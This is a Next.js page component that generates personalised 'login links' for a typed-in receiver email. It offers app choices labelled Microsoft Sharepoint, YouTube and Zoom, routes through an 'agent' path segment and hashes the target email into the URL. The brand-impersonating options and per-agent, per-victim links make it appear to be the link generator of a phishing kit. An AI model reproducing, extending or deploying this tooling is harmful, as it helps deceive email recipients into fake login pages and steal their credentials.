import { useState, useRef } from 'react';
import { useRouter } from 'next/router';
import { message } from 'antd-notifications-messages';
import { makeHash } from '@utilities/hash';

const copy = (link) => {
  navigator.clipboard.writeText(link);
  message({
    type: 'success',
    message: `Email copied successfully!`,
  });
};

export default function Home() {
  const [app, setApp] = useState('file-share');
  const [email, setEmail] = useState('');
  const ref = useRef();
  const router = useRouter();
  const { agent } = router.query;

  const updateEmail = (event) => {
    event.preventDefault();
    setEmail(ref.current.value);
  };

  const onSelect = (e) => {
    e.preventDefault();
    setApp(e.target.value);
  };

  const getAppLink = () => {
    const host = window.location.host;
    return `${
      window.location.protocol
    }//${host}/${agent}/${app}/?hash=${makeHash('email=' + email)}`;
  };

  return (
    <div className="link-container">
      <link
        rel="stylesheet"
        href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
      />
      <div className="link-wrapper">
        <h1
          className="title"
          style={{ fontSize: '100%', fontWeight: 'inherit' }}
        >
          Provide the receiver email to generate login link
        </h1>
        <div className="link-search-container">
          <form onSubmit={updateEmail}>
            <div className="form-group">
              <label htmlFor="exampleSelect">Select Application</label>
              <select
                className="form-control"
                onChange={onSelect}
                id="exampleSelect"
                defaultValue="file-share"
              >
                <option value="file-share">Microsoft | Sharepoint</option>
                <option value="youtube-product">Youtube | Product</option>
                <option value="youtube-real-estate">
                  Youtube | Real Estate
                </option>
                <option value="zoom" disabled>
                  Zoom
                </option>
              </select>
            </div>
            <input
              type="text"
              className="form-control"
              ref={ref}
              placeholder="Enter receiver email"
              id="x2"
              name="x2"
              required
            />
            <div className="link-generate-button">
              <input type="submit" value="Generate Link" />
            </div>
          </form>
          {email && (
            <div className="link-url-container">
              <code>{getAppLink()}</code>
              <button
                className="btn btn-primary"
                onClick={() => copy(getAppLink())}
              >
                Copy
              </button>
            </div>
          )}
        </div>
        <footer className="link-footer">
          Made with{' '}
          <img
            src="/netliheart.svg"
            alt="Netlify Logo"
            className="Footer_logo__AdUui"
          />{' '}
          for you
        </footer>
      </div>
    </div>
  );
}
